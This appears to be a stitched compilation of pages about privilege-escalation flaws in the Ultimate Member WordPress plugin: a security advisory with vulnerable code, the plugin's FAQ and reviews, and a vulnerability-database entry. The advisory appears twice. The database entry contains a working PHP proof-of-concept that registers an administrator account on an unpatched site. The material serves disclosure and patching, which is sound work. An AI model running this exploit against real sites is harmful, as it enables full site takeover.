# Critical Privilege Escalation Vulnerabilities Affect 100K Sites Using Ultimate Member Plugin

On October 23, 2020, our Threat Intelligence team responsibly disclosed several vulnerabilities in [Ultimate Member](https://wordpress.org/plugins/ultimate-member/), a WordPress plugin installed on over 100,000 sites. These flaws made it possible for attackers to escalate their privileges to those of an administrator and take over a WordPress site.

We initially reached out to the plugin’s developer on October 23, 2020. After establishing an appropriate communication channel, we provided the full disclosure details on October 26, 2020. The developer provided us with a copy of the first intended patch on October 26, 2020 for us to test. We confirmed the patch fixed one of the vulnerabilities, however, two still remained. On October 29, 2020, the plugin’s developer provided us with an updated copy which fully addressed all vulnerabilities. The plugin’s developer released a patched version of Ultimate Member, 2.1.12, on October 29, 2020.

These are critical and severe vulnerabilities that are easy to exploit. Therefore, **we highly recommend updating to the patched version, 2.1.12, immediately.**

Wordfence Premium users received a firewall rule to protect against any exploits targeting these vulnerabilities on October 23, 2020. Sites still using the free version of Wordfence will receive the same protection on November 22, 2020.

## Unauthenticated Privilege Escalation via User Meta

**Description:** Privilege Escalation

**Affected Plugin:** Ultimate Member

**Plugin Slug:** ultimate-member

**Affected Versions:** <= 2.1.11

**CVE ID:** [CVE-2020-36155](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36155)

**CVSS Score:** 10.0 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.1.12

Ultimate Member is a popular plugin designed to enhance user registration and account control on WordPress sites. It allows site owners to create custom roles and manage the privileges of site members. As part of its functionality, the plugin automatically creates three forms: user registration, user login, and user profile management.

We discovered that the user registration form lacked some checks on submitted user data. This oversight made it possible for an attacker to supply arbitrary user meta keys during the registration process that would update those meta keys in the database. This meant that an attacker could supply an array parameter for sensitive meta data such as the `wp_capabilities` user meta which defines a user’s role. During the registration process, submitted registration details were passed to the `update_profile` function, and any respective metadata that was submitted, regardless of what was submitted, would be updated for that newly registered user.

```
do_action( 'um_before_save_registration_details', $this->id, $submitted );

			update_user_meta( $this->id, 'submitted', $submitted );

			$this->update_profile( $submitted );
```
```
function update_profile( $changes ) {

			$args['ID'] = $this->id;
```
```
$changes = apply_filters( 'um_before_update_profile', $changes, $args['ID'] );

			foreach ( $changes as $key => $value ) {
				if ( ! in_array( $key, $this->update_user_keys ) ) {
					if ( $value === 0 ) {
						update_user_meta( $this->id, $key, '0' );
					} else {
						update_user_meta( $this->id, $key, $value );
					}
				} else {
					$args[ $key ] = esc_attr( $changes[ $key ] );
				}
			}
```

This meant that an attacker simply needed to supply `wp_capabilities[administrator]` as part of a registration request, and that attacker would effectively update the `wp_capabilities` field with the administrator role. This simple request would grant administrator access upon registration.

This vulnerability is considered very critical as it makes it possible for originally unauthenticated users to easily escalate their privileges to those of an administrator. Once an attacker has administrative access to a WordPress site, they have effectively taken over the entire site and can perform any action, from taking the site offline to further infecting the site with malware.

## Unauthenticated Privilege Escalation via User Roles

**Description:** Privilege Escalation

**Affected Plugin:** Ultimate Member

**Plugin Slug:** ultimate-member

**Affected Versions:** <= 2.1.11

**CVE ID:** [CVE-2020-36157](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36157)

**CVSS Score:** 10.0 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.1.12

This vulnerability is related to the previously detailed vulnerability. Due to the lack of filtering on the role parameter that could be supplied during the registration process, an attacker could supply the role parameter with a WordPress capability or any custom Ultimate Member role and effectively be granted those privileges. After updating the user meta, the plugin checked if the role parameter was supplied. If so, a few checks were processed to verify the role being supplied.

```
// update user
			if ( count( $args ) > 1 ) {
				//if isset roles argument validate role to properly for security reasons
				if ( isset( $args['role'] ) ) {
					global $wp_roles;
					$um_roles = get_option( 'um_roles' );

					if ( ! empty( $um_roles ) ) {
						$role_keys = array_map( function( $item ) {
							return 'um_' . $item;
						}, get_option( 'um_roles' ) );
					} else {
						$role_keys = array();
					}

					$exclude_roles = array_diff( array_keys( $wp_roles->roles ), array_merge( $role_keys, array( 'subscriber' ) ) );

					if ( in_array( $args['role'], $exclude_roles ) ) {
						unset( $args['role'] );
					}
				}

				wp_update_user( $args );
			}

		}
```

Fortunately, the plugin blocked default WordPress roles from being supplied in the role parameter making it more difficult for attackers to be able to exploit this vulnerability to gain escalated privileges. In addition, if the role selector was enabled for the registration form, then only the roles specified by the site administrator could be selected and supplied during registration.

However, it did not stop custom Ultimate Member roles from being supplied or individual WordPress capabilities prior to updating the user role. Therefore, despite the initial protections, an attacker could still easily gain elevated privileges.

Attackers could enumerate the current custom Ultimate Members roles and supply a higher privileged role while registering in the role parameter. Or, an attacker could supply a specific capability and then use that to switch to another user account with elevated privileges. In either case, if wp-admin access was enabled for that user or role, then this vulnerability could be used in conjunction with the final vulnerability detailed below.

Again, this vulnerability is considered critical as it allows originally unauthenticated users to escalate their privileges with some conditions. Once an attacker has elevated access to a WordPress site, they can potentially take over the entire and further infect the site with malware.

## Authenticated Privilege Escalation via Profile Update

**Description:** Privilege Escalation

**Affected Plugin:** Ultimate Member

**Plugin Slug:** ultimate-member

**Affected Versions:** <= 2.1.11

**CVE ID:** [CVE-2020-36156](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36156)

**CVSS Score:** 9.9 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.1.12

This final vulnerability was introduced due to a lack of capability checks on a profile update. Due to the fact that Ultimate Member allowed the creation of new roles, this plugin also made it possible for site administrators to grant secondary Ultimate Member roles for all users. This was intended to allow a user to have default privileges for a built-in role, such as editor, but also have additional secondary privileges to extend capabilities of a membership site using Ultimate Member. The plugin uses a function, `profile_update` which runs whenever a user’s profile is updated to update the Ultimate Member role for any given user. This function used `is_admin()` alone without a capability check, making it possible for any user to supply the um-role post field and set their role to one of their choosing.

```
			function profile_update( $user_id, $old_data ) {
			// Bail if no user ID was passed
			if ( empty( $user_id ) ) {
				return;
			}

			$old_roles = $old_data->roles;
			$userdata  = get_userdata( $user_id );
			$new_roles = $userdata->roles;

			if ( is_admin() ) {
				if ( ! empty( $_POST['um-role'] ) ) {
					$new_roles = array_merge( $new_roles, array( $_POST['um-role'] ) );
					if ( ! user_can( $user_id, $_POST['um-role'] ) ) {
						UM()->roles()->set_role( $user_id, $_POST['um-role'] );
					}
				}
			}
}
			}
```

This meant that any user with wp-admin access to the profile.php page, whether explicitly allowed or via another vulnerability used to gain that access, could supply the parameter `um-role` with a value set to any role including `administrator` during a profile update and effectively escalate their privileges to those of that role.

As with the previous vulnerabilities outlined above, this vulnerability is considered critical as it makes it possible for authenticated users to escalate their privileges with very little difficulty. Once an attacker has administrator privileges on a WordPress site, they have effectively taken over the entire site.

  I was blocked from using my site two days ago. It showed "code 403". Do I correct this by buying the premium version of word fence? How do I get the patch for the "Ultimate Member" plugin?

## FAQ

### Do I need to know any coding to use this plugin?

No, we have built Ultimate Member to be extremely easy to use and does not require you to manually build shortcodes or have any coding knowledge.

### Is Ultimate Member mobile responsive?

Yes. Ultimate Member is designed to adapt nicely to any screen resolution. It includes specific designs for phones, tablets and desktops.

### Is Ultimate Member multi-site compatible?

Yes. Ultimate Member works great on both single site and multi-site WordPress installs.

### Does the plugin work with any WordPress theme?

Yes. Ultimate Member will work with any properly coded theme. However, some themes may cause conflicts with the plugin. If you find a styling issue with your theme please create a post in the community forum.

### Does the plugin work with caching plugins?

The plugin works with popular caching plugins by automatically excluding Ultimate Member pages from being cached. This ensures other visitors to a page will not see the private information of another user. However, if you add features of Ultimate Member to other pages you have to exclude those pages from being cached through your cache plugin settings panel.

### Does Ultimate Member restrict access to wp-login.php when the plugin is active?

The plugin does not restrict access to the wp-login.php page when active, so that our plugin does not interfere with the existing functionality of a website or other plugins that may utilise the default login page. If you wish to restrict access to the wp-login.php page you can use a plugin such as [WPS Hide Login](https://wordpress.org/plugins/wps-hide-login/) or another plugin that removes the ability to login via wp-login.php.

### Are Ultimate Member Login/Registration pages required?

No, you do not need to use our plugin’s login or registration pages and can use another plugin or the default WordPress methods for user registration and login.

### Are additional PHP modules necessary for the plugin to work correctly?

No specific extensions are needed. But we highly recommended keep active these PHP modules: `mbstring`, `json`, `dom`, `exif`, `gd`, `fileinfo`, `curl`, `iconv`. wp-admin > Tools > Site Health page has a summary about your installation and required modules. All major extensions are listed [here](https://make.wordpress.org/hosting/handbook/server-environment/#php-extensions).

### [Fantastic for private (members only) websites with great support](https://wordpress.org/support/topic/unresponsive-support-confusing-unadjustable-directory-ux/)

If you are looking for a member directory that supports your members in search/sorting/filtering to find members based on specific criteria, including a googlemaps (~$) integration, this plugin can do it. It is also fantastic for creating members-only accessible content for part (or all!) of your website.
In addition, the team behind this plug-in have been very responsive to queries, providing exceptional support and communications.

This plugin has made managing users on my website so much easier. The ability to assign custom roles and permissions is a lifesaver for my multi-author blog. However, the interface could use a bit more polishing as it’s not entirely intuitive.

Every time an update for this plugin comes out, I have to redo all the translations of the emails in settings again. Is there nothing you can do about that?

How can I fix a typo in a checkbox without losing the selection of this field for users who have already selected it? I’m faced with the problem that after changing the text in a checkbox, the values for those who have previously selected it disappear.

## WordPress Plugin Vulnerabilities

# Ultimate Member < 2.1.12 - Unauthenticated Privilege Escalation via User Meta

### Description

An attacker could supply an array parameter for sensitive meta data such as the wp\_capabilities user meta which defines a user’s role. During the registration process, submitted registration details were passed to the update\_profile function, and any respective metadata that was submitted, regardless of what was submitted, would be updated for that newly registered user. This simple request would grant administrator access upon registration.

### Proof of Concept

<?php
// Settings
$wp\_url = $argv[1];
$username = $argv[2];
$name = $argv[3];
$lastname = $argv[4];
$email = $argv[5];
$um\_role = $argv[6];
// Pull the Nonce
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/register');
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
preg\_match('/\_wpnonce"\svalue="([^"]+)"/', $content, $matches);
$nonce = $matches[1];
// Pull the form\_id
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/register');
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
preg\_match('/id=\"form\_id\_([^"]+)"/', $content, $matches);
$form\_id = $matches[1];
// Update Settings
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/register');
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'user\_login-' . $form\_id => $username,
'first\_name-'. $form\_id => $name,
'last\_name-' . $form\_id => $lastname,
'user\_email-' . $form\_id => $email,
'user\_password-' . $form\_id => 'StrongPassword123!',
'confirm\_user\_password-' . $form\_id => 'StrongPassword123!',
'wp\_capabilities[administrator]' => '',
'form\_id' => $form\_id,
'timestamp' => '1603399250',
'um\_request' => '',
'\_wpnonce' => $nonce,
'\_wp\_http\_referer' => 'register'
]);
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>

# Critical Privilege Escalation Vulnerabilities Affect 100K Sites Using Ultimate Member Plugin

On October 23, 2020, our Threat Intelligence team responsibly disclosed several vulnerabilities in [Ultimate Member](https://wordpress.org/plugins/ultimate-member/), a WordPress plugin installed on over 100,000 sites. These flaws made it possible for attackers to escalate their privileges to those of an administrator and take over a WordPress site.

We initially reached out to the plugin’s developer on October 23, 2020. After establishing an appropriate communication channel, we provided the full disclosure details on October 26, 2020. The developer provided us with a copy of the first intended patch on October 26, 2020 for us to test. We confirmed the patch fixed one of the vulnerabilities, however, two still remained. On October 29, 2020, the plugin’s developer provided us with an updated copy which fully addressed all vulnerabilities. The plugin’s developer released a patched version of Ultimate Member, 2.1.12, on October 29, 2020.

These are critical and severe vulnerabilities that are easy to exploit. Therefore, **we highly recommend updating to the patched version, 2.1.12, immediately.**

Wordfence Premium users received a firewall rule to protect against any exploits targeting these vulnerabilities on October 23, 2020. Sites still using the free version of Wordfence will receive the same protection on November 22, 2020.

## Unauthenticated Privilege Escalation via User Meta

**Description:** Privilege Escalation

**Affected Plugin:** Ultimate Member

**Plugin Slug:** ultimate-member

**Affected Versions:** <= 2.1.11

**CVE ID:** [CVE-2020-36155](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36155)

**CVSS Score:** 10.0 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.1.12

Ultimate Member is a popular plugin designed to enhance user registration and account control on WordPress sites. It allows site owners to create custom roles and manage the privileges of site members. As part of its functionality, the plugin automatically creates three forms: user registration, user login, and user profile management.

We discovered that the user registration form lacked some checks on submitted user data. This oversight made it possible for an attacker to supply arbitrary user meta keys during the registration process that would update those meta keys in the database. This meant that an attacker could supply an array parameter for sensitive meta data such as the `wp_capabilities` user meta which defines a user’s role. During the registration process, submitted registration details were passed to the `update_profile` function, and any respective metadata that was submitted, regardless of what was submitted, would be updated for that newly registered user.

```
do_action( 'um_before_save_registration_details', $this->id, $submitted );

			update_user_meta( $this->id, 'submitted', $submitted );

			$this->update_profile( $submitted );
```
```
function update_profile( $changes ) {

			$args['ID'] = $this->id;
```
```
$changes = apply_filters( 'um_before_update_profile', $changes, $args['ID'] );

			foreach ( $changes as $key => $value ) {
				if ( ! in_array( $key, $this->update_user_keys ) ) {
					if ( $value === 0 ) {
						update_user_meta( $this->id, $key, '0' );
					} else {
						update_user_meta( $this->id, $key, $value );
					}
				} else {
					$args[ $key ] = esc_attr( $changes[ $key ] );
				}
			}
```

This meant that an attacker simply needed to supply `wp_capabilities[administrator]` as part of a registration request, and that attacker would effectively update the `wp_capabilities` field with the administrator role. This simple request would grant administrator access upon registration.

This vulnerability is considered very critical as it makes it possible for originally unauthenticated users to easily escalate their privileges to those of an administrator. Once an attacker has administrative access to a WordPress site, they have effectively taken over the entire site and can perform any action, from taking the site offline to further infecting the site with malware.

## Unauthenticated Privilege Escalation via User Roles

**Description:** Privilege Escalation

**Affected Plugin:** Ultimate Member

**Plugin Slug:** ultimate-member

**Affected Versions:** <= 2.1.11

**CVE ID:** [CVE-2020-36157](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36157)

**CVSS Score:** 10.0 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.1.12

This vulnerability is related to the previously detailed vulnerability. Due to the lack of filtering on the role parameter that could be supplied during the registration process, an attacker could supply the role parameter with a WordPress capability or any custom Ultimate Member role and effectively be granted those privileges. After updating the user meta, the plugin checked if the role parameter was supplied. If so, a few checks were processed to verify the role being supplied.

```
// update user
			if ( count( $args ) > 1 ) {
				//if isset roles argument validate role to properly for security reasons
				if ( isset( $args['role'] ) ) {
					global $wp_roles;
					$um_roles = get_option( 'um_roles' );

					if ( ! empty( $um_roles ) ) {
						$role_keys = array_map( function( $item ) {
							return 'um_' . $item;
						}, get_option( 'um_roles' ) );
					} else {
						$role_keys = array();
					}

					$exclude_roles = array_diff( array_keys( $wp_roles->roles ), array_merge( $role_keys, array( 'subscriber' ) ) );

					if ( in_array( $args['role'], $exclude_roles ) ) {
						unset( $args['role'] );
					}
				}

				wp_update_user( $args );
			}

		}
```

Fortunately, the plugin blocked default WordPress roles from being supplied in the role parameter making it more difficult for attackers to be able to exploit this vulnerability to gain escalated privileges. In addition, if the role selector was enabled for the registration form, then only the roles specified by the site administrator could be selected and supplied during registration.

However, it did not stop custom Ultimate Member roles from being supplied or individual WordPress capabilities prior to updating the user role. Therefore, despite the initial protections, an attacker could still easily gain elevated privileges.

Attackers could enumerate the current custom Ultimate Members roles and supply a higher privileged role while registering in the role parameter. Or, an attacker could supply a specific capability and then use that to switch to another user account with elevated privileges. In either case, if wp-admin access was enabled for that user or role, then this vulnerability could be used in conjunction with the final vulnerability detailed below.

Again, this vulnerability is considered critical as it allows originally unauthenticated users to escalate their privileges with some conditions. Once an attacker has elevated access to a WordPress site, they can potentially take over the entire and further infect the site with malware.

## Authenticated Privilege Escalation via Profile Update

**Description:** Privilege Escalation

**Affected Plugin:** Ultimate Member

**Plugin Slug:** ultimate-member

**Affected Versions:** <= 2.1.11

**CVE ID:** [CVE-2020-36156](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36156)

**CVSS Score:** 9.9 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.1.12

This final vulnerability was introduced due to a lack of capability checks on a profile update. Due to the fact that Ultimate Member allowed the creation of new roles, this plugin also made it possible for site administrators to grant secondary Ultimate Member roles for all users. This was intended to allow a user to have default privileges for a built-in role, such as editor, but also have additional secondary privileges to extend capabilities of a membership site using Ultimate Member. The plugin uses a function, `profile_update` which runs whenever a user’s profile is updated to update the Ultimate Member role for any given user. This function used `is_admin()` alone without a capability check, making it possible for any user to supply the um-role post field and set their role to one of their choosing.

```
			function profile_update( $user_id, $old_data ) {
			// Bail if no user ID was passed
			if ( empty( $user_id ) ) {
				return;
			}

			$old_roles = $old_data->roles;
			$userdata  = get_userdata( $user_id );
			$new_roles = $userdata->roles;

			if ( is_admin() ) {
				if ( ! empty( $_POST['um-role'] ) ) {
					$new_roles = array_merge( $new_roles, array( $_POST['um-role'] ) );
					if ( ! user_can( $user_id, $_POST['um-role'] ) ) {
						UM()->roles()->set_role( $user_id, $_POST['um-role'] );
					}
				}
			}
}
			}
```

This meant that any user with wp-admin access to the profile.php page, whether explicitly allowed or via another vulnerability used to gain that access, could supply the parameter `um-role` with a value set to any role including `administrator` during a profile update and effectively escalate their privileges to those of that role.

As with the previous vulnerabilities outlined above, this vulnerability is considered critical as it makes it possible for authenticated users to escalate their privileges with very little difficulty. Once an attacker has administrator privileges on a WordPress site, they have effectively taken over the entire site.

  I was blocked from using my site two days ago. It showed "code 403". Do I correct this by buying the premium version of word fence? How do I get the patch for the "Ultimate Member" plugin?
